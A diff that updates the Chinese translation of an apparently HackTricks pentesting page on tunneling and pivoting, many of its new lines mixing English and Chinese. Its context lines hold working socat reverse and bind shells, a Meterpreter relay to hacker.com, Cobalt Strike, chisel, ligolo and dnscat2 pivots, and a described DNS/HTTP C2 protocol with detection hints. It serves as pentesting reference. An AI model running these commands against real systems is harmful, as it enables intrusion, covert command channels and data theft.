@@ -2,10 +2,10 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Nmap tip
+## Nmap 提示
 
 > [!WARNING]
-> **ICMP** 和 **SYN** 扫描无法通过 socks 代理进行隧道传输，因此我们必须 **禁用 ping 发现** (`-Pn`) 并指定 **TCP 扫描** (`-sT`) 以使其工作。
+> **ICMP** 和 **SYN** scans 无法通过 socks proxies 进行隧道化，所以我们必须 **disable ping discovery** (`-Pn`) 并指定 **TCP scans** (`-sT`) 才能生效。
 
 ## **Bash**
 
@@ -33,7 +33,7 @@ ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
 ### Local Port2Port
 
-在SSH服务器中打开新端口 --> 其他端口
+在 SSH Server 上打开新的 Port --> 其他 Port
 ```bash
 ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
 ```
@@ -43,7 +43,7 @@ ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in
 ```
 ### Port2Port
 
-本地端口 --> 被攻陷的主机 (SSH) --> 第三方主机:端口
+本地 port --> 被攻陷的 host (SSH) --> Third_box:Port
 ```bash
 ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
 #Example
@@ -51,13 +51,13 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 ### Port2hostnet (proxychains)
 
-本地端口 --> 被攻陷的主机 (SSH) --> 任何地方
+本地端口 --> 被攻陷的主机 (SSH) --> 任意地方
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
-### 反向端口转发
+### Reverse Port Forwarding
 
-这对于通过 DMZ 从内部主机获取反向 shell 到您的主机非常有用：
+这在通过 DMZ 从内部主机获取 reverse shells 到你的主机时很有用：
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -68,15 +68,15 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tunnel
 
-您需要**在两个设备上具有root权限**（因为您将创建新的接口），并且sshd配置必须允许root登录：\
+你需要 **root in both devices** (因为你将创建新的 interfaces) 并且 sshd config 必须允许 root 登录：\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
 ssh root@server -w any:any #This will create Tun interfaces in both devices
 ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
-ifconfig tun0 up #Activate the client side network interface
+ip link set tun0 up #Activate the client side network interface
 ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
-ifconfig tun0 up #Activate the server side network interface
+ip link set tun0 up #Activate the server side network interface
 ```
 在服务器端启用转发
 ```bash
@@ -88,13 +88,13 @@ iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
 route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
-> **安全 – Terrapin 攻击 (CVE-2023-48795)**
-> 2023年的Terrapin降级攻击可以让中间人篡改早期的SSH握手并将数据注入到**任何转发通道**（`-L`，`-R`，`-D`）。确保客户端和服务器都已打补丁（**OpenSSH ≥ 9.6/LibreSSH 6.7**），或者在依赖SSH隧道之前明确禁用易受攻击的`chacha20-poly1305@openssh.com`和`*-etm@openssh.com`算法，在`sshd_config`/`ssh_config`中进行设置。
+> **Security – Terrapin Attack (CVE-2023-48795)**
+> 2023 年的 Terrapin 降级攻击可能允许中间人篡改早期的 SSH 握手并向 **任何转发通道** (`-L`, `-R`, `-D`) 注入数据。确保客户端和服务器都已修补（**OpenSSH ≥ 9.6/LibreSSH 6.7**），或在 `sshd_config`/`ssh_config` 中显式禁用易受攻击的 `chacha20-poly1305@openssh.com` 和 `*-etm@openssh.com` 算法，然后再依赖 SSH 隧道。
 
 ## SSHUTTLE
 
-您可以通过**ssh**将所有**流量**隧道到**子网络**通过一个主机。\
-例如，转发所有流量到10.10.10.0/24
+你可以通过 **ssh** **隧道** 将所有 **流量** 转发到一个 **子网**，经由一台主机。\
+例如，转发所有发往 10.10.10.0/24 的流量
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -108,7 +108,7 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-本地端口 --> 被攻陷的主机（活动会话） --> 第三方主机:端口
+本地 port --> 已攻陷 host (active session) --> Third_box:Port
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
@@ -136,9 +136,9 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 ```
 ## Cobalt Strike
 
-### SOCKS 代理
+### SOCKS proxy
 
-在 teamserver 中打开一个端口，监听所有接口，以便 **通过 beacon 路由流量**。
+在 teamserver 上打开一个在所有接口上监听的端口，可用于**通过 beacon 路由流量**。
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -149,21 +149,21 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> 在这种情况下，**端口在信标主机上打开**，而不是在团队服务器上，流量被发送到团队服务器，然后从那里发送到指定的主机:端口
+> 在这种情况下，**port is opened in the beacon host**，而不是在 Team Server 上。流量会先发送到 Team Server，然后从那里转发到指定的 host:port
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
-需要注意：
+注意：
 
-- Beacon 的反向端口转发旨在 **将流量隧道传输到 Team Server，而不是在单个机器之间中继**。
-- 流量在 **Beacon 的 C2 流量中隧道传输**，包括 P2P 链接。
-- **不需要管理员权限** 来在高端口上创建反向端口转发。
+- Beacon 的 reverse port forward 设计用于将流量**隧道到 Team Server，而不是在各台机器之间中继**。
+- 流量**在 Beacon 的 C2 流量内进行隧道化**，包括 P2P links。
+- **不需要 Admin privileges** 就能在高端口创建 reverse port forwards。
 
-### rPort2Port 本地
+### rPort2Port local
 
 > [!WARNING]
-> 在这种情况下，**端口在 beacon 主机上打开**，而不是在 Team Server 上，**流量发送到 Cobalt Strike 客户端**（而不是 Team Server），然后从那里发送到指定的主机:端口。
+> 在这种情况下，**端口是在 beacon host 上打开的**，而不是在 Team Server 上，且**流量会发送到 Cobalt Strike client**（不是发送到 Team Server），然后从那里转发到指定的 host:port
 ```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
@@ -172,14 +172,14 @@ rportfwd_local stop [bind port]
 
 [https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)
 
-您需要上传一个网络文件隧道：ashx|aspx|js|jsp|php|php|jsp
+你需要上传一个用于隧道的 Web 文件：ashx|aspx|js|jsp|php|php|jsp
 ```bash
 python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
 ```
 ## Chisel
 
-您可以从 [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) 的发布页面下载它。\
-您需要为客户端和服务器使用 **相同的版本**。
+你可以从 [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\ 的 releases 页面下载它\
+你需要使用 **相同版本的 client 和 server**
 
 ### socks
 ```bash
@@ -190,7 +190,7 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
 ./chisel client -v 10.10.10.10:8080 socks #Attacker
 ```
-### 端口转发
+### Port forwarding
 ```bash
 ./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
 ./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
@@ -199,9 +199,9 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 
 [https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
 
-**代理和代理使用相同版本**
+**请为 agent 和 proxy 使用相同的版本**
 
-### 隧道技术
+### Tunneling
 ```bash
 # Start proxy server and automatically generate self-signed TLS certificates -- Attacker
 sudo ./proxy -selfcert
@@ -223,7 +223,7 @@ interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_age
 # Display the tun interfaces -- Attacker
 interface_list
 ```
-### 代理绑定和监听
+### Agent 绑定与监听
 ```bash
 # Establish a tunnel from the proxy server to the agent
 # Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
@@ -231,7 +231,7 @@ listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
 # Display the currently running listeners on the agent -- Attacker
 listener_list
 ```
-### 访问代理的本地端口
+### 访问 Agent 的本地端口
 ```bash
 # Establish a tunnel from the proxy server to the agent
 # Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
@@ -241,8 +241,8 @@ interface_add_route --name "ligolo" --route 240.0.0.1/32
 
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
 
-反向隧道。隧道从受害者开始。\
-在 127.0.0.1:1080 上创建一个 socks4 代理。
+反向隧道。隧道由受害者发起。\
+在127.0.0.1:1080上创建了一个socks4代理
 ```bash
 attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
 ```
@@ -250,7 +250,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-通过 **NTLM 代理** 进行枢轴
+通过 **NTLM proxy** 进行横向移动
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -262,12 +262,12 @@ victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntl
 
 [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
 
-### 绑定 shell
+### Bind shell
 ```bash
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
 ```
-### 反向 shell
+### Reverse shell
 ```bash
 attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
@@ -276,11 +276,11 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```bash
 socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```
-### 通过socks的Port2Port
+### Port2Port 通过 socks
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
-### 通过 SSL Socat 的 Meterpreter
+### Meterpreter 通过 SSL Socat
 ```bash
 #Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
 attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
@@ -290,7 +290,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-您可以通过在受害者的控制台中执行这一行来绕过**非认证代理**，而不是最后一行：
+你可以通过执行这一行来绕过 **non-authenticated proxy**，代替受害者控制台中的最后一行：
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -300,7 +300,7 @@ OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacke
 
 **/bin/sh console**
 
-在客户端和服务器两侧创建证书：
+在两端创建证书：客户端和服务器端
 ```bash
 # Execute these commands on both sides
 FILENAME=socatssl
@@ -324,9 +324,9 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-它就像一个控制台版本的 PuTTY（选项与 ssh 客户端非常相似）。
+它类似于控制台版的 PuTTY（选项与 ssh client 非常相似）。
 
-由于这个二进制文件将在受害者的机器上执行，并且它是一个 ssh 客户端，我们需要打开我们的 ssh 服务和端口，以便能够建立反向连接。然后，要将仅本地可访问的端口转发到我们机器上的一个端口：
+由于该 binary 会在 victim 上执行，且它是一个 ssh client，我们需要打开我们的 ssh service 和 port，以便建立 reverse connection。然后，要将仅本地可访问的端口转发到我们机器上的 port：
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -335,7 +335,7 @@ echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0
 
 ### Port2Port
 
-您需要是本地管理员（对于任何端口）
+你需要是 local admin（针对任何端口）
 ```bash
 netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
 # Example:
@@ -347,38 +347,38 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-您需要拥有**系统的RDP访问权限**。\
+你需要对目标系统拥有 **RDP 访问权限**。\
 下载：
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 此工具使用Windows的远程桌面服务功能中的`Dynamic Virtual Channels`（`DVC`）。DVC负责**在RDP连接上隧道数据包**。
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 该工具使用来自 Remote Desktop Service（Windows 的一项功能）的 `Dynamic Virtual Channels` (`DVC`)。DVC 负责 **通过 RDP 连接隧道化数据包**。
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
-在您的客户端计算机上加载**`SocksOverRDP-Plugin.dll`**，如下所示：
+在你的客户端计算机上按如下方式加载 **`SocksOverRDP-Plugin.dll`**：
 ```bash
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-现在我们可以通过 **RDP** 使用 **`mstsc.exe`** 连接到 **victim**，我们应该收到一个 **prompt**，提示 **SocksOverRDP 插件已启用**，并且它将 **listen** 在 **127.0.0.1:1080**。
+现在我们可以使用 **`mstsc.exe`** 通过 **RDP** **connect** 到 **victim**，并且应该会收到一个 **prompt**，显示 **SocksOverRDP plugin is enabled**，并且它会在 **127.0.0.1:1080** **listen**。
 
-通过 **RDP** 连接，并在受害者机器上上传并执行 `SocksOverRDP-Server.exe` 二进制文件：
+通过 **RDP** **Connect**，在 **victim** 机器上上传并执行 `SocksOverRDP-Server.exe` 二进制文件：
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
-现在，在你的机器（攻击者）上确认端口 1080 正在监听：
+现在在你的机器 (attacker) 上确认端口 1080 是否在监听:
 ```
 netstat -antb | findstr 1080
 ```
-现在您可以使用 [**Proxifier**](https://www.proxifier.com/) **通过该端口代理流量。**
+Now you can use [**Proxifier**](https://www.proxifier.com/) **通过该端口代理流量。**
 
-## 代理 Windows GUI 应用程序
+## 让 Windows GUI 应用使用代理
 
-您可以使用 [**Proxifier**](https://www.proxifier.com/) 使 Windows GUI 应用程序通过代理导航。\
+你可以使用 [**Proxifier**](https://www.proxifier.com/) 让 Windows GUI 应用通过代理访问网络。\
 在 **Profile -> Proxy Servers** 中添加 SOCKS 服务器的 IP 和端口。\
-在 **Profile -> Proxification Rules** 中添加要代理的程序名称和要代理的 IP 连接。
+在 **Profile -> Proxification Rules** 中添加要代理的程序名以及你想代理的目标 IP 的连接规则。 
 
 ## NTLM 代理绕过
 
-之前提到的工具：**Rpivot**\
+前面提到的工具：**Rpivot**\
 **OpenVPN** 也可以绕过它，在配置文件中设置这些选项：
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
@@ -387,8 +387,8 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-它对代理进行身份验证，并在本地绑定一个端口，该端口转发到您指定的外部服务。然后，您可以通过此端口使用您选择的工具。\
-例如，转发端口 443
+它对代理进行身份验证，并在本地绑定一个端口，该端口会被转发到你指定的外部服务。然后，你可以通过该端口使用任意工具。\
+例如，将端口 443 转发
 ```
 Username Alice
 Password P@ssw0rd
@@ -396,12 +396,12 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-现在，如果你在受害者的**SSH**服务上设置监听端口为443。你可以通过攻击者的2222端口连接到它。\
-你也可以使用连接到localhost:443的**meterpreter**，而攻击者在2222端口监听。
+Now，例如在 victim 上将 **SSH** 服务设置为监听端口 443。你可以通过 attacker 的端口 2222 连接到它。\
+你也可以使用一个连接到 localhost:443 的 **meterpreter**，而 attacker 在端口 2222 上监听。
 
 ## YARP
 
-由微软创建的反向代理。你可以在这里找到它: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
+由 Microsoft 创建的反向代理。你可以在这里找到它： [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
 
 ## DNS Tunneling
 
@@ -409,21 +409,21 @@ Tunnel 2222:<attackers_machine>:443
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-在两个系统中都需要root权限，以创建tun适配器并通过DNS查询在它们之间隧道数据。
+两台系统上都需要 Root 权限来创建 tun adapters，并通过 DNS 查询在它们之间隧道数据。
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-隧道将非常慢。您可以通过使用以下命令在此隧道中创建一个压缩的SSH连接：
+隧道会非常慢。你可以通过以下方式在该隧道上建立压缩的 SSH 连接：
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
 ### DNSCat2
 
-[**从这里下载**](https://github.com/iagox86/dnscat2)**.**
+[**Download it from here**](https://github.com/iagox86/dnscat2)**.**
 
-通过DNS建立C\&C通道。它不需要root权限。
+通过 DNS 建立 C\&C 通道。它不需要 root 权限。
 ```bash
 attacker> ruby ./dnscat2.rb tunneldomain.com
 victim> ./dnscat2 tunneldomain.com
@@ -434,7 +434,7 @@ victim> ./dnscat2 --dns host=10.10.10.10,port=5353
 ```
 #### **在 PowerShell 中**
 
-您可以使用 [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) 在 PowerShell 中运行 dnscat2 客户端：
+你可以使用 [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) 在 PowerShell 中运行 dnscat2 客户端：
 ```
 Import-Module .\dnscat2.ps1
 Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
@@ -444,56 +444,56 @@ Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret som
 session -i <sessions_id>
 listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
 ```
-#### 更改 proxychains DNS
+#### 更改 proxychains 的 DNS
 
-Proxychains 拦截 `gethostbyname` libc 调用，并通过 socks 代理隧道 tcp DNS 请求。默认情况下，proxychains 使用的 DNS 服务器是 **4.2.2.2**（硬编码）。要更改它，请编辑文件： _/usr/lib/proxychains3/proxyresolv_ 并更改 IP。如果您在 **Windows 环境** 中，可以设置 **域控制器** 的 IP。
+Proxychains 截获 `gethostbyname` libc 调用，并通过 socks proxy 将 tcp DNS 请求隧道化。By **default** the **DNS** server that proxychains use is **4.2.2.2** (hardcoded)。要更改它，编辑文件：_/usr/lib/proxychains3/proxyresolv_ 并修改 IP。如果你在 **Windows environment**，可以设置 **domain controller** 的 IP。
 
-## Go 中的隧道
+## 用 Go 的隧道
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
 ### 自定义 DNS TXT / HTTP JSON C2 (AK47C2)
 
-Storm-2603 行动者创建了一个 **双通道 C2 ("AK47C2")**，仅利用出站 **DNS** 和 **普通 HTTP POST** 流量——这两种协议在企业网络中很少被阻止。
+The Storm-2603 actor created a **dual-channel C2 ("AK47C2")** that abuses *only* outbound **DNS** and **plain HTTP POST** traffic – two protocols that are rarely blocked on corporate networks.
 
 1. **DNS 模式 (AK47DNS)**
 • 生成一个随机的 5 字符 SessionID（例如 `H4T14`）。
-• 为 *任务请求* 前缀 `1`，为 *结果* 前缀 `2`，并连接不同字段（标志、SessionID、计算机名称）。
-• 每个字段都用 ASCII 密钥 `VHBD@H` **XOR 加密**，十六进制编码，并用点连接在一起——最终以攻击者控制的域名结束：
+• 在开头加 `1` 表示 *task requests*，或 `2` 表示 *results*，并连接不同字段（flags、SessionID、computer name）。
+• 每个字段是 **XOR-encrypted with the ASCII key `VHBD@H`**，hex-encoded，并用点连接 —— 最后以攻击者控制的域名结尾：
 
 ```text
 <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
 ```
 
-• 请求使用 `DnsQuery()` 获取 **TXT**（并回退到 **MG**）记录。
-• 当响应超过 0xFF 字节时，后门 **将数据分片**为 63 字节，并插入标记：
-`s<SessionID>t<TOTAL>p<POS>` 以便 C2 服务器可以重新排序它们。
+• Requests use `DnsQuery()` for **TXT** (and fallback **MG**) records.
+• 当响应超过 0xFF 字节时，后门会 **fragment** 数据为 63 字节的片段并插入标记：
+`s<SessionID>t<TOTAL>p<POS>`，以便 C2 服务器可以重新排序它们。
 
 2. **HTTP 模式 (AK47HTTP)**
-• 构建一个 JSON 信封：
+• 构建一个 JSON 包裹：
 ```json
 {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
 ```
-• 整个数据块进行 XOR-`VHBD@H` → 十六进制 → 作为 **`POST /`** 的主体发送，头部为 `Content-Type: text/plain`。
-• 回复遵循相同的编码，`cmd` 字段通过 `cmd.exe /c <command> 2>&1` 执行。
+• 整个 blob 先 XOR-`VHBD@H` → hex → 作为 **`POST /`** 的主体发送，头为 `Content-Type: text/plain`。
+• 回复采用相同编码，`cmd` 字段通过 `cmd.exe /c <command> 2>&1` 执行。
 
-蓝队注意事项
-• 寻找不寻常的 **TXT 查询**，其第一个标签是长十六进制，并且总是以一个稀有域名结束。
-• 一个恒定的 XOR 密钥后跟 ASCII-十六进制很容易用 YARA 检测： `6?56484244?484`（十六进制中的 `VHBD@H`）。
-• 对于 HTTP，标记纯十六进制且字节数为偶数的 text/plain POST 主体。
+Blue Team notes
+• 查找不寻常的 **TXT queries**：其第一个标签是长十六进制串并且总是以某个罕见域名结尾。
+• 固定的 XOR 密钥后跟 ASCII-hex 很容易用 YARA 检测：`6?56484244?484`（`VHBD@H` 的十六进制表示）。
+• 对于 HTTP，标记那些 text/plain POST body 为纯十六进制且字节数为偶数的情况。
 
 {{#note}}
-整个通道适合 **标准 RFC 兼容查询**，并保持每个子域标签在 63 字节以下，使其在大多数 DNS 日志中隐蔽。
+整个通道符合 **standard RFC-compliant queries**，并将每个子域标签保持在 63 字节以内，使其在大多数 DNS 日志中更隐蔽。
 {{#endnote}}
 
-## ICMP 隧道
+## ICMP Tunneling
 
 ### Hans
 
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-在两个系统中都需要 root 权限，以创建 tun 适配器并使用 ICMP 回显请求在它们之间隧道数据。
+两端系统都需要 root 权限，以创建 tun adapters 并使用 ICMP echo requests 在它们之间隧道化数据。
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -501,7 +501,7 @@ ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.1
 ```
 ### ptunnel-ng
 
-[**从这里下载**](https://github.com/utoni/ptunnel-ng.git)。
+[**从这里下载**](https://github.com/utoni/ptunnel-ng.git).
 ```bash
 # Generate it
 sudo ./autogen.sh
@@ -517,12 +517,12 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ```
 ## ngrok
 
-[**ngrok**](https://ngrok.com/) **是一个可以通过一条命令行将解决方案暴露到互联网的工具。**\
-_暴露的 URI 类似于:_ **UID.ngrok.io**
+[**ngrok**](https://ngrok.com/) **是一个可以用一条命令将服务暴露到互联网的工具。**\
+_暴露的 URI 例如：_ **UID.ngrok.io**
 
 ### 安装
 
-- 创建一个账户: https://ngrok.com/signup
+- 注册账号: https://ngrok.com/signup
 - 客户端下载:
 ```bash
 tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
@@ -532,11 +532,11 @@ chmod a+x ./ngrok
 ```
 ### 基本用法
 
-**文档:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
+**文档：** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
-_如果需要，也可以添加身份验证和TLS。_
+_如果需要，也可以添加身份验证和 TLS。_
 
-#### 隧道 TCP
+#### Tunneling TCP
 ```bash
 # Pointing to 0.0.0.0:4444
 ./ngrok tcp 4444
@@ -544,17 +544,17 @@ _如果需要，也可以添加身份验证和TLS。_
 # Listen (example): nc -nvlp 4444
 # Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
 ```
-#### 通过HTTP暴露文件
+#### 使用 HTTP 暴露文件
 ```bash
 ./ngrok http file:///tmp/httpbin/
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
 ```
-#### 嗅探 HTTP 调用
+#### 嗅探 HTTP 请求
 
-_对 XSS, SSRF, SSTI ... 有用_\
-直接从 stdout 或在 HTTP 接口 [http://127.0.0.1:4040](http://127.0.0.1:4000)。
+_适用于 XSS、SSRF、SSTI 等..._\
+直接从 stdout 或在 HTTP interface [http://127.0.0.1:4040](http://127.0.0.1:4000) 查看。
 
-#### 隧道内部 HTTP 服务
+#### 为内部 HTTP 服务建立隧道
 ```bash
 ./ngrok http localhost:8080 --host-header=rewrite
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
@@ -566,7 +566,7 @@ _对 XSS, SSRF, SSTI ... 有用_\
 它打开 3 个隧道：
 
 - 2 个 TCP
-- 1 个 HTTP，静态文件从 /tmp/httpbin/ 暴露
+- 1 个 HTTP，提供来自 /tmp/httpbin/ 的静态文件
 ```yaml
 tunnels:
 mytcp:
@@ -581,7 +581,7 @@ addr: file:///tmp/httpbin/
 ```
 ## Cloudflared (Cloudflare Tunnel)
 
-Cloudflare的 `cloudflared` 守护进程可以创建出站隧道，暴露 **本地 TCP/UDP 服务**，而无需入站防火墙规则，使用Cloudflare的边缘作为会合点。当出站防火墙仅允许HTTPS流量而入站连接被阻止时，这非常方便。
+Cloudflare 的 `cloudflared` 守护进程可以创建出站隧道，暴露 **本地 TCP/UDP 服务**，无需配置入站防火墙规则，使用 Cloudflare 的边缘作为汇合点。当出站防火墙只允许 HTTPS 流量而入站连接被阻止时，这非常有用。
 
 ### 快速隧道一行命令
 ```bash
@@ -589,13 +589,13 @@ Cloudflare的 `cloudflared` 守护进程可以创建出站隧道，暴露 **本�
 cloudflared tunnel --url http://localhost:8080
 # => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
 ```
-### SOCKS5 透传
+### SOCKS5 pivot
 ```bash
 # Turn the tunnel into a SOCKS5 proxy on port 1080
 cloudflared tunnel --url socks5://localhost:1080 --socks5
 # Now configure proxychains to use 127.0.0.1:1080
 ```
-### 使用DNS的持久隧道
+### 使用 DNS 的持久隧道
 ```bash
 cloudflared tunnel create mytunnel
 cloudflared tunnel route dns mytunnel internal.example.com
@@ -604,17 +604,17 @@ Tunnel: <TUNNEL-UUID>
 credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
 url: http://127.0.0.1:8000
 ```
-开始连接器：
+启动连接器：
 ```bash
 cloudflared tunnel run mytunnel
 ```
-因为所有流量都通过主机 **出站 443** 端口发送，Cloudflared 隧道是绕过入口 ACL 或 NAT 边界的简单方法。请注意，二进制文件通常以提升的权限运行 - 尽可能使用容器或 `--user` 标志。
+Because all traffic leaves the host **outbound over 443**, Cloudflared tunnels are a simple way to bypass ingress ACLs or NAT boundaries. Be aware that the binary usually runs with elevated privileges – use containers or the `--user` flag when possible.
 
-## FRP (快速反向代理)
+## FRP (Fast Reverse Proxy)
 
-[`frp`](https://github.com/fatedier/frp) 是一个积极维护的 Go 反向代理，支持 **TCP、UDP、HTTP/S、SOCKS 和 P2P NAT 穿透**。从 **v0.53.0 (2024年5月)** 开始，它可以充当 **SSH 隧道网关**，因此目标主机可以仅使用标准的 OpenSSH 客户端启动反向隧道 - 无需额外的二进制文件。
